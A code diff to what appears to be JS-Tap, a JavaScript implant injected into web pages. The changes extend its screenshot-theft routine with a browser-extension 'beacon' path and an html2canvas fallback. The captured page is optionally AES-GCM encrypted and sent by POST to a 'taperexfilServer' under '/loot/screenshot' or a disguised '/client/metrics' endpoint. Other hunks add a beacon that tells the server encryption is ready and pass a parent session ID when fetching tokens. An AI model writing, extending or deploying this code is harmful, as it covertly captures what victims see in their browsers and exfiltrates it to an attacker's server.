@@ -349,61 +349,118 @@ function canAccessIframe(iframe) {
 
 
 function sendScreenshot() {
-	if (typeof html2canvas !== "function") {
-		console.error("html2canvas is not available.");
-		return;
+	// Helper to run standard html2canvas capture
+	const runHtml2Canvas = () => {
+		if (typeof html2canvas !== "function") {
+			console.error("html2canvas is not available.");
+			return;
+		}
+
+		// Pick the right document reference
+		const myReference = (window.taperMode === "trap")
+		? document.getElementById("iframe_a").contentDocument
+		: document;
+
+		html2canvas(myReference.getElementsByTagName("html")[0], { 
+			scale: 1,
+			useCORS: true,           // Essential for Reddit CDN images
+			allowTaint: false,       // Keep false if using CORS
+			logging: true,           // Help debug in console
+			taintTest: false,
+			backgroundColor: "#ffffff", // Ensure it's not transparent
+			imageTimeout: 15000,     // Give images time to load
+			removeContainer: true
+		})
+		.then(canvas => {
+			canvas.toBlob(async (blob) => {
+				if (window.taperMetricsBox) {
+			  // Convert the blob to an ArrayBuffer for encryption
+					const arrayBuffer = await blob.arrayBuffer();
+			  // Generate a random IV for AES-GCM encryption
+					const ivArray = window.crypto.getRandomValues(new Uint8Array(12));
+			  // Encrypt the fixed path "/loot/screenshot" so your server knows how to handle it
+					const pathData = new TextEncoder().encode("/loot/screenshot");
+					const encryptedPath = await window.crypto.subtle.encrypt(
+						{ name: "AES-GCM", iv: ivArray },
+						window.taperMetricsBox,
+						pathData
+						);
+			  // Encrypt the screenshot data
+					const encryptedMessage = await window.crypto.subtle.encrypt(
+						{ name: "AES-GCM", iv: ivArray },
+						window.taperMetricsBox,
+						arrayBuffer
+						);
+			  // Convert the IV, encrypted path, and encrypted message to Base64 strings
+					const ivBase64 = arrayBufferToBase64(ivArray);
+					const pathBase64 = arrayBufferToBase64(encryptedPath);
+					const messageBase64 = arrayBufferToBase64(encryptedMessage);
+			  // Build the comma-separated payload string
+					const payloadString = ivBase64 + "," + pathBase64 + "," + messageBase64;
+					const payload = { metricData: payloadString };
+	
+			  // Send to the unified /client/metrics endpoint
+					const request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem("taperSessionUUID"));
+					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+					request.send(JSON.stringify(payload));
+				} else {
+			  // Send the plain screenshot blob to the unencrypted endpoint
+					const request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem("taperSessionUUID"));
+					request.send(blob);
+				}
+			}, "image/png");
+		})
+		.catch(err => console.error("Error capturing screenshot:", err));
+	};
+
+	// 1. Try Hybrid BEX-Assist Screenshot first (if spawned by a beacon)
+	if (window.taperParentUUID) {
+		try {
+			const sessionUUID = sessionStorage.getItem("taperSessionUUID");
+			const isEncrypted = !!window.taperMetricsBox;
+			
+			// Setup one-time listener for result
+			const resultHandler = (event) => {
+				if (event.source !== window || event.data?.type !== "BEX_SCREENSHOT_RESULT") return;
+				
+				window.removeEventListener("message", resultHandler);
+				clearTimeout(fallbackTimer);
+				
+				if (event.data.success) {
+					console.log("JS-Tap: Hybrid screenshot success. Skipping html2canvas.");
+				} else {
+					console.log("JS-Tap: Hybrid screenshot skipped/failed (" + event.data.reason + "). Running html2canvas fallback.");
+					runHtml2Canvas();
+				}
+			};
+			window.addEventListener("message", resultHandler);
+
+			// Send message to BEX content script
+			window.postMessage({
+				type: "BEX_SCREENSHOT_REQUEST",
+				sessionUUID: sessionUUID,
+				isEncrypted: isEncrypted
+			}, "*");
+			
+			// Fallback timer in case extension is dead/slow
+			const fallbackTimer = setTimeout(() => {
+				window.removeEventListener("message", resultHandler);
+				console.log("JS-Tap: Hybrid screenshot timed out. Running html2canvas fallback.");
+				runHtml2Canvas();
+			}, 2000);
+
+			return; // Exit and wait for async result/timeout
+		} catch (e) {
+			// No beacon support, fall through
+		}
 	}
 
-  // Pick the right document reference
-	const myReference = (window.taperMode === "trap")
-	? document.getElementById("iframe_a").contentDocument
-	: document;
-
-	html2canvas(myReference.getElementsByTagName("html")[0], { scale: 1 })
-	.then(canvas => {
-		canvas.toBlob(async (blob) => {
-			if (window.taperMetricsBox) {
-          // Convert the blob to an ArrayBuffer for encryption
-				const arrayBuffer = await blob.arrayBuffer();
-          // Generate a random IV for AES-GCM encryption
-				const ivArray = window.crypto.getRandomValues(new Uint8Array(12));
-          // Encrypt the fixed path "/loot/screenshot" so your server knows how to handle it
-				const pathData = new TextEncoder().encode("/loot/screenshot");
-				const encryptedPath = await window.crypto.subtle.encrypt(
-					{ name: "AES-GCM", iv: ivArray },
-					window.taperMetricsBox,
-					pathData
-					);
-          // Encrypt the screenshot data
-				const encryptedMessage = await window.crypto.subtle.encrypt(
-					{ name: "AES-GCM", iv: ivArray },
-					window.taperMetricsBox,
-					arrayBuffer
-					);
-          // Convert the IV, encrypted path, and encrypted message to Base64 strings
-				const ivBase64 = arrayBufferToBase64(ivArray);
-				const pathBase64 = arrayBufferToBase64(encryptedPath);
-				const messageBase64 = arrayBufferToBase64(encryptedMessage);
-          // Build the comma-separated payload string
-				const payloadString = ivBase64 + "," + pathBase64 + "," + messageBase64;
-				const payload = { metricData: payloadString };
-
-          // Send to the unified /client/metrics endpoint
-				const request = new window.taperXHR();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem("taperSessionUUID"));
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-				request.send(JSON.stringify(payload));
-			} else {
-          // Send the plain screenshot blob to the unencrypted endpoint
-				const request = new window.taperXHR();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem("taperSessionUUID"));
-				request.send(blob);
-			}
-		}, "image/png");
-	})
-	.catch(err => console.error("Error capturing screenshot:", err));
+	// 2. Standard Fallback (No beacon)
+	runHtml2Canvas();
 }
 
 
@@ -1682,6 +1739,12 @@ async function checkMetrics(token) {
               // `initMetrics` sends encrypted data, and `initCatcher` lets us decrypt received data.
               await initMetrics(hexToUint8Array(sendKeyHex));
               await initCatcher(hexToUint8Array(receiveKeyHex));
+
+              // Notify server that we are crypto-capable
+              const confirmReq = new window.taperXHR();
+              confirmReq.noIntercept = true;
+              confirmReq.open("GET", window.taperexfilServer + "/client/confirmCrypto/" + token);
+              confirmReq.send(null);
             }
             // Resolve the promise once processing is complete.
             resolve();
@@ -1721,14 +1784,19 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 		// Get our client UUID
 			request = new window.taperXHR();
 			request.noIntercept = true;
-			if (window.taperTag === "")
+			
+			var getTokenUrl = window.taperexfilServer + "/client/getToken";
+			if (window.taperTag !== "")
 			{
-				request.open("GET", window.taperexfilServer + "/client/getToken", true);
+				getTokenUrl += "/" + window.taperTag;
 			}
-			else
+			
+			if (window.taperParentUUID)
 			{
-				request.open("GET", window.taperexfilServer + "/client/getToken/" + window.taperTag, true);
+				getTokenUrl += "?parent=" + window.taperParentUUID;
 			}
+			
+			request.open("GET", getTokenUrl, true);
 			request.send(null);
 
 			request.onreadystatechange = async function()
